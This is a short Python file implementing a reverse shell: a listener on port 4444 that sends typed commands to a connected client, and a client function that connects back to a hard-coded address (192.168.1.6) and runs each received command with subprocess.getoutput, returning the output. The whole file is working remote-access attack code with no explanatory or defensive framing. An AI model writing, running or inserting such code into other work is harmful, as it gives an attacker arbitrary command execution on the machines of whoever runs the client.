import socket
import subprocess

def start_server(server_ip='0.0.0.0', server_port=4444):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((server_ip, server_port))
    server_socket.listen()

    print(f"[*] Listening on {server_ip}:{server_port}")

    client_socket, client_address = server_socket.accept()
    print(f"[*] Connection received from {client_address}")

    while True:
        command = input("Command>")

        if command.lower() == "exit":
            client_socket.send(command.encode("utf-8"))
            break

        client_socket.send(command.encode("utf-8"))

        output = client_socket.recv(4096).decode("utf-8")
        print(output)

    client_socket.close()
    server_socket.close()


def handle_client(server_ip="192.168.1.6", server_port=4444):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try: 
        client_socket.connect((server_ip, server_port))

        while True:
            command = client_socket.recv(1024).decode("utf-8")

            if command.lower() == 'exit':
                break
            output = subprocess.getoutput(command)

            client_socket.send(output.encode("utf-8"))

        client_socket.close()
    except Exception as e:
        print(f"Erro: {e}")
        client_socket.close()